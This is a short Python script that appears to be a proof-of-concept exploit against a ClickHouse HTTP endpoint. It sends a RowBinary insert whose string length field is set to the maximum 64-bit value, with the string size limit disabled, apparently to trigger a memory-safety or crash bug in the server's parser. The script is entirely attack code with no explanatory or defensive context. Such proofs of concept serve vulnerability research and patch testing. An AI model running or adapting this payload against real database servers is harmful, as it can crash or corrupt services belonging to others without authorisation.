import sys
import requests


def varuint(value):
    result = bytearray()
    while value >= 128:
        result.append((value & 127) | 128)
        value >>= 7
    result.append(value)
    return bytes(result)


def trigger(endpoint):
    body = varuint(64) + b'A' * 64
    body += varuint(0xffffffffffffffff) + b'B' * 6144
    params = {
        'query': "INSERT INTO FUNCTION null('a String') FORMAT RowBinary",
        'format_binary_max_string_size': 0,
    }
    return requests.post(endpoint, params=params, data=body, timeout=10)


if __name__ == '__main__':
    trigger(sys.argv[1])
